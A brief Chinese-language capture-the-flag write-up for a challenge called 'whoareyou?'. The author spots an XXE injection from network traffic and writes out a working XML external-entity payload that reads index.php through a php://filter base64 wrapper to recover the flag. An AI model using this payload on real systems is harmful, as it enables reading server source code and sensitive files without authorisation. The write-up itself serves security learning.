0x02 whoareyou?

打开界面发现个输入框


随便输入点东西，然后用开发者工具监控一下流量


一看就是XXE实体注入，构造语句

  1. <?xml version="1.0" encoding="UTF-8"?>
  2. <!DOCTYPE feedback [
  3. <!ENTITY author SYSTEM "php://filter/convert.base64-encode/resource=index.php">
  4. ]>
  5. <feedback><author>&author;</author></feedback>

 

base64解码可得flag
